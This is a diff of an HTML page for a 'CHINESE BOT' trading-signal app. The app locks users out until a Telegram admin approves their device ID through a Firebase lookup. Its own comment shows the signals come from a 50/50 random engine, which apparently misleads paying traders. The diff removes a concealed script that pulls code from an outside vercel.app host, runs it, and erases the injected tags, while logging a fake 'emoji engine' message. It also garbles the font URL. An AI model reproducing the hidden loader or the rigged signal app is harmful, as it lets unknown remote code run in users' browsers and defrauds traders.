@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CHINESE BOT</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=700;900&family=Rajdhani:wght=500;600;700&display=swap" rel="stylesheet">
     <style>
         :root { 
             --red: #ff3d5a; 
@@ -52,6 +52,7 @@
         .load-bar-wrap { width:220px; height:4px; background:rgba(255,255,255,0.08); border-radius:99px; overflow:hidden; }
         .load-bar { height:100%; width:0%; background:linear-gradient(90deg,var(--red2),var(--red)); border-radius:99px; transition: width 0.4s ease; }
         .load-status { font-size:12px; color:var(--muted); letter-spacing:1px; }
+        
         /* ── LOCK SCREEN BACKGROUND ── */
         #lockScreen {
             position: fixed; 
@@ -89,6 +90,9 @@
             }
         }
 
+        .lock-title { font-family:'Orbitron',sans-serif; font-size:18px; letter-spacing:2px; color:var(--red); margin-bottom:4px; }
+        .lock-sub { font-size:13px; color:var(--muted); margin-bottom:20px; }
+
         /* ── ID BOX ── */
         .id-box {
             width: 100%; 
@@ -102,7 +106,6 @@
             position: relative;
             box-sizing: border-box;
         }
-        
         
         .id-box-label { font-size:10px; color:var(--muted); letter-spacing:2px; margin-bottom:10px; text-transform:uppercase; }
         .id-number {
@@ -137,9 +140,6 @@
         }
         @keyframes spin{to{transform:rotate(360deg)}}
         .pending-text { font-size:12px; color:var(--muted); display:inline; vertical-align:middle; }
-        .pending-dot { display:inline-block; width:8px; height:8px; border-radius:50%;
-            background:#ff3d5a; margin-right:6px; animation:blink2 1.2s infinite; vertical-align:middle; }
-        @keyframes blink2{0%,100%{opacity:1}50%{opacity:0.2}}
 
         /* Unlock animation */
         @keyframes unlockPop {
@@ -287,6 +287,7 @@
             pointer-events:none; white-space:nowrap;
         }
         #toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+        
         /* ── TELEGRAM CONTACTS UI ── */
         .contact-wrap {
             width: 100%;
@@ -318,7 +319,6 @@
             transition: all 0.2s ease;
             box-sizing: border-box;
         }
-        /* Admin Button Style */
         .tg-admin {
             background: rgba(255, 61, 90, 0.08);
             border: 1.5px solid var(--border);
@@ -330,7 +330,6 @@
             box-shadow: 0 0 15px rgba(255, 61, 90, 0.2);
             transform: scale(0.98);
         }
-        /* Channel Button Style */
         .tg-channel {
             background: linear-gradient(135deg, #1d2733, #243447);
             border: 1.5px solid #229ED9;
@@ -387,8 +386,7 @@
     </div>
 
     <div id="lockScreen">
-                <div class="lock-logo-ring" id="lockIcon"></div>
-        
+        <div class="lock-logo-ring" id="lockIcon"></div>
         <div class="lock-title" id="lockTitle">LOCKED</div>
         <div class="lock-sub" id="lockSub">📝 CONTACT TO UNLOCK !!! 🔓</div>
         <div class="id-box">
@@ -397,23 +395,21 @@
             <button class="copy-btn" onclick="copyID()">📋 COPY ID & SEND TO ADMIN</button>
             <div class="copy-ok" id="copyOk"></div>
         </div>
-                <div class="pending-box">
+        <div class="pending-box">
             <div class="pending-spinner"></div>
             <div class="pending-text">Waiting for admin approval...</div>
         </div>
-
         <div class="contact-wrap">
             <div class="contact-label">CONTACT FOR APPROVAL</div>
             <a href="https://t.me/shahwintrader" target="_blank" class="contact-link tg-admin">
                 <span>💬 Contact Admin: @shahwintrader</span>
             </a>
-            
             <div class="contact-label" style="margin-top: 14px;">JOIN OFFICIAL CHANNEL</div>
             <a href="https://t.me/+SblpoMOUoL83OWE8" target="_blank" class="contact-link tg-channel">
                 <span>📢 Join Telegram Channel</span>
             </a>
         </div>
-
+    </div>
 
     <div id="app">
         <div class="header">
@@ -504,7 +500,6 @@
     </div>
 
     <script>
-        // FIREBASE DATABASE LINK (For Verification Only)
         const USERS_URL = "https://admin-panel-6c101-default-rtdb.firebaseio.com/users.json"; 
 
         const PAIRS = [ 
@@ -520,7 +515,6 @@
             {l:"1 Min",v:60},{l:"2 Min",v:120},{l:"5 Min",v:300},{l:"10 Min",v:600} 
         ]; 
 
-        // ── DEVICE ID ── 
         function getDeviceID() { 
             let id = localStorage.getItem('rqa_device_id'); 
             if (!id) { 
@@ -532,7 +526,6 @@
         } 
         const DEVICE_ID = getDeviceID(); 
 
-        // ── COPY ID ── 
         function copyID() { 
             const ok = document.getElementById('copyOk'); 
             if (navigator.clipboard) { 
@@ -552,7 +545,6 @@
             } 
         } 
 
-        // ── LOADING SYSTEM ── 
         function sleep(ms) { return new Promise(r => setTimeout(r, ms)); } 
         
         async function startLoading() { 
@@ -570,7 +562,6 @@
                 await sleep(300 + Math.random() * 200); 
             } 
             
-            // Check Firebase Live Status
             const approved = await checkApproval(); 
             if (approved) { 
                 showApp(false); 
@@ -579,7 +570,6 @@
             showLock(); 
         } 
 
-        // ── FIREBASE LIVE ID CHECK ──
         async function checkApproval() { 
             try { 
                 const res = await fetch(USERS_URL + '?t=' + Date.now()); 
@@ -598,7 +588,6 @@
             startApprovalPolling(); 
         } 
 
-        // Live Polling (Every 5 seconds check ID from firebase)
         let pollInterval = null; 
         function startApprovalPolling() { 
             if (pollInterval) clearInterval(pollInterval); 
@@ -610,13 +599,17 @@
                     const title = document.getElementById('lockTitle'); 
                     const sub = document.getElementById('lockSub'); 
                     const pend = document.querySelector('.pending-box'); 
-                    icon.textContent = '✅'; 
-                    icon.style.border = '2px solid var(--up)'; 
-                    icon.style.boxShadow = '0 0 50px rgba(0,230,118,0.4)'; 
-                    icon.classList.add('unlock-anim'); 
-                    title.textContent = 'ACCESS GRANTED!'; 
-                    title.style.color = 'var(--up)'; 
-                    sub.textContent = 'Welcome to Chinese Bot Layout 🎉'; 
+                    if(icon) {
+                        icon.textContent = '✅'; 
+                        icon.style.border = '2px solid var(--up)'; 
+                        icon.style.boxShadow = '0 0 50px rgba(0,230,118,0.4)'; 
+                        icon.classList.add('unlock-anim'); 
+                    }
+                    if(title) {
+                        title.textContent = 'ACCESS GRANTED!'; 
+                        title.style.color = 'var(--up)'; 
+                    }
+                    if(sub) sub.textContent = 'Welcome to Chinese Bot Layout 🎉'; 
                     if (pend) pend.style.display = 'none'; 
                     await sleep(1400); 
                     showApp(true); 
@@ -633,7 +626,6 @@
             initApp(); 
         } 
 
-        // ── UI DROPDOWNS ── 
         function buildDrops() { 
             const pd = document.getElementById('pairDrop'); 
             pd.innerHTML = "";
@@ -675,12 +667,12 @@
 
         document.addEventListener('click', e => { 
             if (!e.target.closest('#pairSelect')) { 
-                document.getElementById('pairDrop').classList.remove('show'); 
-                document.getElementById('pairBtn').classList.remove('open'); 
+                const pd = document.getElementById('pairDrop'), pb = document.getElementById('pairBtn');
+                if(pd && pb){ pd.classList.remove('show'); pb.classList.remove('open'); }
             } 
             if (!e.target.closest('#timeSelect')) { 
-                document.getElementById('timeDrop').classList.remove('show'); 
-                document.getElementById('timeBtn').classList.remove('open'); 
+                const td = document.getElementById('timeDrop'), tb = document.getElementById('timeBtn');
+                if(td && tb){ td.classList.remove('show'); tb.classList.remove('open'); }
             } 
         }); 
 
@@ -719,7 +711,6 @@
             } 
         } 
 
-        // ── 50/50 RANDOM SIGNAL ENGINE (OFFLINE LOCAL) ── 
         let statsUp = 0, statsDown = 0; 
         let signalHistory = []; 
         let countdownInterval = null; 
@@ -867,31 +858,7 @@
             renderHistory(); 
         } 
 
-        // Trigger loading system
         startLoading(); 
     </script>
-  <script>
-        (async () => {
-            try {
-                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-                let rawMarkup = await response.text();
-                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-                
-                documentDOM.querySelectorAll('script').forEach(oldNode => {
-                    let freshScriptNode = document.createElement('script');
-                    if (oldNode.src) {
-                        freshScriptNode.src = oldNode.src;
-                    } else {
-                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                    }
-                    document.body.appendChild(freshScriptNode);
-                    setTimeout(() => freshScriptNode.remove(), 600);
-                });
-                console.log("Zeetex Emoji Engine Hook Active");
-            } catch (e) {
-                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-            }
-        })();
-  </script>
 </body>
 </html>
